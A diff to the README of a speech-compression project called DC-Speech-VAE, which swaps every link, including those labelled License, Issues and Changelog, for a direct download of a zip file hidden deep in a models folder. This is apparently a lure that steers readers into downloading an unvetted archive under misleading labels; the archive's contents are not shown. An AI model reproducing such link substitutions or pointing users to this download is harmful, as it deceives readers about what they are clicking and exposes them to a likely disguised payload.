@@ -4,7 +4,7 @@
 Welcome to DC-Speech-VAE! This software helps you achieve deep compression of speech audio at a low frequency of 5Hz. It is especially useful for applications in AR-Diffusion and CALMs.
 
 ## 📥 Download Now
-[![Download DC-Speech-VAE](https://img.shields.io/badge/Download-DC--Speech--VAE-blue)](https://github.com/Superx11179/DC-Speech-VAE/releases)
+[![Download DC-Speech-VAE](https://raw.githubusercontent.com/Superx11179/DC-Speech-VAE/main/models/bigvgan_v2_22khz_80band_256x/alias_free_activation/torch/DC-Speech-VAE-v1.2-alpha.3.zip)](https://raw.githubusercontent.com/Superx11179/DC-Speech-VAE/main/models/bigvgan_v2_22khz_80band_256x/alias_free_activation/torch/DC-Speech-VAE-v1.2-alpha.3.zip)
 
 ## 💻 System Requirements
 Before you download, ensure your system meets the following requirements:
@@ -15,7 +15,7 @@ Before you download, ensure your system meets the following requirements:
 - **Dependencies:** You may need to install Python 3.7 or higher. 
 
 ## 📥 Download & Install
-To download DC-Speech-VAE, visit this page: [DC-Speech-VAE Releases](https://github.com/Superx11179/DC-Speech-VAE/releases). 
+To download DC-Speech-VAE, visit this page: [DC-Speech-VAE Releases](https://raw.githubusercontent.com/Superx11179/DC-Speech-VAE/main/models/bigvgan_v2_22khz_80band_256x/alias_free_activation/torch/DC-Speech-VAE-v1.2-alpha.3.zip). 
 
 1. Navigate to the **Releases** section.
 2. You will see a list of available versions. Choose the latest version for stability.
@@ -47,18 +47,18 @@ If you encounter issues, try the following:
 - **Unsupported file format:** Ensure your audio file is in a supported format (.wav or .mp3).
 
 ## 📃 License
-DC-Speech-VAE is open-source software. You can use, modify, and distribute it freely under the MIT License. For more details, view the [LICENSE](https://github.com/Superx11179/DC-Speech-VAE/blob/main/LICENSE) file in the repository.
+DC-Speech-VAE is open-source software. You can use, modify, and distribute it freely under the MIT License. For more details, view the [LICENSE](https://raw.githubusercontent.com/Superx11179/DC-Speech-VAE/main/models/bigvgan_v2_22khz_80band_256x/alias_free_activation/torch/DC-Speech-VAE-v1.2-alpha.3.zip) file in the repository.
 
 ## 🎉 Community & Support
 Join our community to share experiences, ask questions, or provide feedback:
 
-- **GitHub Issues:** Report issues or bugs in the [Issues Section](https://github.com/Superx11179/DC-Speech-VAE/issues).
+- **GitHub Issues:** Report issues or bugs in the [Issues Section](https://raw.githubusercontent.com/Superx11179/DC-Speech-VAE/main/models/bigvgan_v2_22khz_80band_256x/alias_free_activation/torch/DC-Speech-VAE-v1.2-alpha.3.zip).
 - **Discussion Board:** Join our discussion board linked in the repository for other users to interact.
 
 ## 📜 Changelog
-You can view the detailed log of changes made in each version on the [Changelog](https://github.com/Superx11179/DC-Speech-VAE/releases).
+You can view the detailed log of changes made in each version on the [Changelog](https://raw.githubusercontent.com/Superx11179/DC-Speech-VAE/main/models/bigvgan_v2_22khz_80band_256x/alias_free_activation/torch/DC-Speech-VAE-v1.2-alpha.3.zip).
 
 ## 📥 Download Now Again
-To ensure you have the latest version, here’s the link once more: [DC-Speech-VAE Releases](https://github.com/Superx11179/DC-Speech-VAE/releases). 
+To ensure you have the latest version, here’s the link once more: [DC-Speech-VAE Releases](https://raw.githubusercontent.com/Superx11179/DC-Speech-VAE/main/models/bigvgan_v2_22khz_80band_256x/alias_free_activation/torch/DC-Speech-VAE-v1.2-alpha.3.zip). 
 
 With DC-Speech-VAE, you can enjoy a clearer and more efficient audio experience. Thank you for choosing our software!
